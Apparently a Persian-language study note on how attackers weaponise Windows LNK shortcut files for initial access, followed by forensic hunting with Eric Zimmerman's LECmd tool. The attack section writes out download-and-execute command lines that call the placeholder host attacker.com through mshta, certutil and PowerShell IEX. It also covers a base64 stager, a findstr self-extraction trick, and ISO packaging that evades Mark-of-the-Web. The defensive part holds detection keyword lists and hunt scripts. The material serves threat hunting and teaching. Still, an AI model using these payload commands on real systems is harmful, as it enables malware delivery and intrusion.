
# LNK Files در Initial Access

## ساختار فنی LNK

فایل `.lnk` یک **binary format** هست (Shell Link Binary File Format) که توسط ویندوز برای shortcut استفاده میشه.

LNK File Structure:
├── Shell Link Header (76 bytes)
├── LinkTargetIDList
├── LinkInfo (path اصلی)
├── StringData
│   ├── WorkingDirectory
│   ├── CommandLineArguments  ← مهم‌ترین بخش برای مهاجم
│   └── IconLocation
└── ExtraData


---

## چرا LNK برای مهاجمان جذابه؟

1. پسوند .lnk در Explorer مخفیه (حتی با "Show extensions")
2. میتونه CommandLineArguments دلخواه اجرا کنه
3. Icon رو میشه جعل کرد (PDF, Word, ...)
4. حجم payload محدودیتی نداره (از طریق پارامتر)
5. به‌راحتی در ISO, ZIP, Email embed میشه


---

## مکانیزم اجرا

### ساده‌ترین حالت
Target: C:\Windows\System32\cmd.exe
Arguments: /c powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
Icon: %SystemRoot%\system32\shell32.dll,1 (آیکون PDF)


### روش Double Extension جعل
فایل واقعی: Invoice_2024.pdf.lnk
نمایش در Explorer: Invoice_2024.pdf  ← کاربر نمیبینه .lnk


---

## تکنیک‌های رایج مهاجمان

### 1. Living off the Land (LOLBins)
```powershell
# از طریق mshta
Target: C:\Windows\System32\mshta.exe
Args: http://attacker.com/payload.hta

# از طریق wscript
Target: C:\Windows\System32\wscript.exe
Args: //b //nologo \\attacker.com\share\script.vbs

# از طریق certutil
Target: cmd.exe
Args: /c certutil -urlcache -f http://attacker.com/payload.exe %TEMP%\p.exe && %TEMP%\p.exe
```

### 2. Multi-Stage با PowerShell
```powershell
Target: powershell.exe
Args: -w 1 -nop -ep bypass -c "$x=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('...')); IEX $x"
```

### 3. LNK داخل ISO (رایج‌ترین chain در 2022-2023)
setup.iso
  └── setup.lnk          ← مهاجم
  └── resources\          ← فایل‌های decoy
      └── document.pdf

وقتی ISO mount میشه:
- LNK بدون MotW هست
- SmartScreen اجرا نمیشه
- کاربر روی setup.lnk کلیک میکنه


---

## Argument Size Bypass

محدودیت LNK برای `CommandLineArguments` حدود **4096 کاراکتر** هست.

راه‌حل مهاجمان:
1. استفاده از forfiles برای اجرای دستور از فایل
2. استفاده از environment variables
3. استفاده از findstr برای extract کردن payload از خود LNK


**تکنیک findstr (خودارجاعی)**
```cmd
cmd.exe /c findstr "PAYLOAD_MARKER" "%CD%\setup.lnk" > %TEMP%\p.ps1 && powershell -ep bypass %TEMP%\p.ps1
```
payload مستقیم **داخل خود LNK** ذخیره میشه و استخراج میشه.

---

## گروه‌های APT و استفاده از LNK

| گروه | کمپین | روش |
|------|-------|-----|
| Emotet | 2022 | LNK داخل ZIP |
| Qakbot | 2022-2023 | LNK داخل ISO |
| APT29 | NOBELIUM | LNK + HTML Smuggling |
| LockBit | 2023 | LNK داخل ZIP |
| IcedID | 2023 | LNK داخل ISO |

---

## Forensic Artifacts برای Hunt

### 1. بررسی محتوای LNK
```powershell
# با PowerShell shell object
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut("C:\path\to\file.lnk")
$lnk.TargetPath
$lnk.Arguments
$lnk.WorkingDirectory
```

### 2. Parse کردن باینری LNK
```powershell
# با module سوم‌شخص: LnkParse3 (Python)
# یا Forensic tools مثل LECmd از Eric Zimmerman

# خواندن raw bytes برای بررسی
[System.IO.File]::ReadAllBytes("file.lnk") | Format-Hex
```

### 3. Event Log های مرتبط
Event ID 4688 (Process Creation):
  - ParentProcess: explorer.exe
  - Process: cmd.exe / powershell.exe / mshta.exe
  
Event ID 4663: Object Access (اگر Auditing فعال باشه)

Sysmon Event ID 1:
  - ParentImage: explorer.exe
  - CommandLine: مشکوک
  
Sysmon Event ID 11 (FileCreate):
  - TargetFilename: *.lnk


### 4. اسکریپت Hunt
```powershell
$locations = @(
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop",
    "$env:TEMP",
    "$env:APPDATA\Microsoft\Windows\Recent"
)

foreach ($loc in $locations) {
    Get-ChildItem $loc -Filter *.lnk -Recurse -EA SilentlyContinue |
    ForEach-Object {
        $sh = New-Object -ComObject WScript.Shell
        $lnk = $sh.CreateShortcut($_.FullName)
        
        # Red Flags
        if ($lnk.Arguments -match "powershell|cmd|mshta|wscript|cscript|certutil|bitsadmin") {
            [PSCustomObject]@{
                File      = $_.FullName
                Target    = $lnk.TargetPath
                Arguments = $lnk.Arguments
                Created   = $_.CreationTime
            }
        }
    }
}
```

---

## Red Flags خلاصه

1. LNK با target روی cmd.exe / powershell.exe / mshta.exe
2. Arguments شامل base64, IEX, DownloadString, certutil
3. Icon path با پسوند جعلی (pdf, docx, ...)
4. LNK داخل ISO یا ZIP بدون MotW
5. LNK در مسیرهای غیرمعمول (Temp, AppData)
6. ParentProcess explorer.exe → ChildProcess powershell با arguments مشکوک





# LECmd.exe

## معرفی

**LECmd** (LNK Explorer Command line) ابزاری از مجموعه **Eric Zimmerman's Tools** هست که برای **parse و تحلیل فارنزیک** فایل‌های LNK طراحی شده.

Eric Zimmerman یکی از معروف‌ترین محققان فارنزیک دیجیتال هست و مجموعه ابزارهاش در DFIR (Digital Forensics & Incident Response) استاندارد صنعتی محسوب میشن.

---

## چرا LECmd؟

مشکل PowerShell Shell Object:
```powershell
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut("file.lnk")
# فقط اطلاعات سطحی برمیگردونه
# TargetPath, Arguments, Description
# خیلی از metadata های باینری رو نمیده
```

LECmd کل **binary structure** فایل LNK رو parse میکنه و اطلاعات بسیار بیشتری استخراج میکنه.

---

## نصب

دانلود از:
https://ericzimmerman.github.io/#!index.md

یا مستقیم:
https://github.com/EricZimmerman/LECmd


نیاز به **.NET 6** داره. فایل exe هست، نیازی به install نیست.

---

## دستورات اصلی

### تحلیل یک فایل
```cmd
LECmd.exe -f "C:\Users\User\Downloads\Invoice.lnk"
```

### تحلیل یک پوشه (recursive)
```cmd
LECmd.exe -d "C:\Users\User\Downloads" --csv "C:\output" --csvf results.csv
```

### تحلیل Recent Files کاربر
```cmd
LECmd.exe -d "C:\Users\User\AppData\Roaming\Microsoft\Windows\Recent" --csv C:\output
```

### Export به JSON
```cmd
LECmd.exe -f "file.lnk" --json "C:\output"
```

---

## خروجی LECmd

وقتی روی یک LNK مشکوک اجرا میکنی، این اطلاعات رو میگیری:

--- Header ---
  Target created:  2024-01-15 08:23:11
  Target modified: 2024-01-15 08:23:11
  Target accessed: 2024-01-15 08:23:11
  File size:       0
  Flags:           HasLinkTargetIDList, HasLinkInfo, HasRelativePath...
  
--- StringData ---
  Name:            Invoice
  Relative Path:   ..\..\..\Windows\System32\cmd.exe     ← مهم
  Working Dir:     C:\Windows\System32
  Icon Location:   C:\Windows\System32\shell32.dll
  Arguments:       /c powershell -w hidden -ep bypass ... ← حیاتی

--- Link Target ID List ---
  Absolute path:   C:\Windows\System32\cmd.exe

--- Tracker Data Block ---
  Machine ID:      DESKTOP-ABC123    ← نام ماشین سازنده
  MAC Address:     00:1A:2B:3C:4D:5E ← MAC سازنده
  Creation time:   2024-01-15 08:00:00 (UTC)


---

## مهم‌ترین فیلدها برای Threat Hunting

### 1. Machine ID و MAC Address
Tracker Data Block:
  Machine ID: DESKTOP-XYZ
  MAC Address: 00:1A:2B:3C:4D:5E

این اطلاعات مربوط به سیستمی هستن که LNK رو ساخته
نه سیستمی که روش اجرا میشه

→ در attribution و clustering کمپین‌های مختلف مفیده
→ اگه MAC با vendor خاصی match کرد (VM vendor) مشخص میشه در VM ساخته شده


### 2. Timestamps
سه timestamp وجود داره:
1. LNK file timestamp   ← زمان کپی/دریافت فایل
2. Target timestamps    ← زمان فایل target (مثلاً cmd.exe)
3. Tracker timestamps   ← زمان ساخت LNK روی سیستم مهاجم

Timestomping detection:
اگه Target Modified > LNK Created باشه → anomaly


### 3. Arguments
کامل‌ترین مقدار Arguments رو نشون میده
حتی اگه PowerShell Object اون رو truncate کرده باشه


### 4. Relative Path
../../../Windows/System32/cmd.exe
→ مشخص میکنه LNK چطور به target اشاره میکنه
→ relative path در فایل‌های داخل ISO رایجه


---

## ارتباط با سناریوی ISO + LNK

مهاجم یه ISO میسازه با این ساختار:
setup.iso
  ├── setup.lnk
  └── resources\
      └── document.pdf


**LECmd روی setup.lnk:**

```cmd
LECmd.exe -f "D:\setup.lnk"

خروجی:
  Arguments:    /c findstr "PAYLOAD" D:\setup.lnk > %TEMP%\p.ps1 && powershell -ep bypass %TEMP%\p.ps1
  Machine ID:   DESKTOP-ATTACKER
  MAC:          00:0C:29:XX:XX:XX  ← VMware MAC prefix
  Target:       C:\Windows\System32\cmd.exe
  Working Dir:  D:\               ← درایو ISO
  Icon:         C:\Windows\System32\imageres.dll,68  ← آیکون PDF جعلی
```

از این خروجی میتونی:
- **payload** رو ببینی
- بفهمی **کجا ساخته شده** (VM سازنده)
- **timestamp** ساخت رو داشته باشی
- با **کمپین‌های دیگه** مقایسه کنی (MAC مشابه = احتمالاً یک مهاجم)

---

## Hunt گروهی با CSV Output

```cmd
LECmd.exe -d "C:\Cases\Evidence\LNK_Files" --csv "C:\output" --csvf hunt_results.csv
```

بعد با PowerShell:
```powershell
Import-Csv "C:\output\hunt_results.csv" |
Where-Object { $_.Arguments -match "powershell|mshta|certutil|bitsadmin|wscript" } |
Select-Object SourceFile, Arguments, MachineID, MACAddress, TargetCreated |
Format-Table -AutoSize
```

---

## خلاصه ارتباط با موضوع

| قابلیت LECmd   | کاربرد در Threat Hunt        |
| -------------- | ---------------------------- |
| Arguments کامل | دیدن payload واقعی           |
| Machine ID     | شناسایی سیستم مهاجم          |
| MAC Address    | clustering کمپین‌ها          |
| Timestamps     | تشخیص timestomping           |
| Relative Path  | تشخیص LNK داخل ISO/Container |
| Tracker Data   | attribution و IoC extraction |

![[Pasted image 20260612221105.png]]
